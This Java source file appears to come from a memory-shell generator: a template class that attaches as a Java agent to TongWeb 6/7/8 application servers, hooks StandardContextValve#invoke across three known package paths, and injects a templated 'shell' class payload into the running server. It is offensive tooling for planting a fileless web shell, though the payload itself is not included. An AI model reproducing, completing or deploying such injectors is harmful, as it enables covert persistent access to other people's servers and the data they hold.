package org.leo.jmg.mem.injectortpl.tongweb;

import org.leo.jmg.mem.agent.AgentInjectorSupport;

import java.lang.instrument.Instrumentation;

/** TongWeb 6/7/8 StandardContextValve#invoke Agent 注入器。 */
public class TongWebContextValveAgentInjector extends AgentInjectorSupport {
    private static String shellClassName;
    private static String shellClass;
    private static final String[] TARGET_CLASSES = new String[]{
            "com/tongweb/web/thor/core/StandardContextValve",
            "com/tongweb/catalina/core/StandardContextValve",
            "com/tongweb/server/core/StandardContextValve"
    };

    public static void premain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new TongWebContextValveAgentInjector());
    }

    public static void agentmain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new TongWebContextValveAgentInjector());
    }

    @Override
    protected String[] targetClasses() {
        return TARGET_CLASSES;
    }

    @Override
    protected String targetMethodName() {
        return "invoke";
    }

    @Override
    protected String shellClassName() {
        return shellClassName;
    }

    @Override
    protected String shellClassPayload() {
        return shellClass;
    }
}
